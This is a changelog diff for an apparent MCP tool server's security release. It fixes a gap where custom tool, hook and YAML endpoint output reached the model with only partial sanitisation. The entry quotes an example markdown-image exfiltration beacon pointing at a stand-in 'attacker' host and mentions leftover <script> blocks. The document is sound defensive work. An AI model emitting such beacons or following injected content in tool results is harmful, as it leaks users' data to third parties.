@@ -5,6 +5,34 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [3.4.0] - 2026-09-02
+
+### Fixed
+
+- **Custom tools, hook short-circuits and YAML endpoints now get the full response defence.** The
+  post-processor wrap ran `sanitizeAndDetect` alone — Step 2 of the five in `defendText` — so a
+  `registerCustomTool()` handler returning remote markdown or HTML reached the model with
+  exfiltration beacons (`![x](https://attacker/?d=…)`) and `<script>` blocks intact. For those
+  channels the wrap is the *only* defence; there is no `processResponse` upstream of them. The wrap
+  now runs the whole pipeline, selecting the strictest grammar because the Content-Type is
+  genuinely unknown at that boundary, and excluding text that parses as a JSON document for the
+  same reason `processResponse` does.
+
+### Added
+
+- **`defendText` is now a public export.** It is the full defence pipeline over a plain string, and
+  the function the built-in tools call. Consumers building a non-MCP pipeline were previously
+  pointed at `sanitizeAndDetect`, described as "the same defence the built-in tools apply" — it is
+  one stage of it. `docs/custom-tools.md` is corrected accordingly.
+
+### Changed
+
+- **`curl_execute` and `jq_query` results are unchanged, deliberately.** Both already run the
+  pipeline under the Content-Type the origin declared, and now mark their successful results so the
+  wrap defers to that better-informed pass rather than re-deciding a grammar it cannot see. Without
+  it, the defence a body received would have depended on `include_metadata`. Their *error* results
+  are not marked and take the full pipeline.
+
 ## [3.3.0] - 2026-09-01
 
 ### Fixed
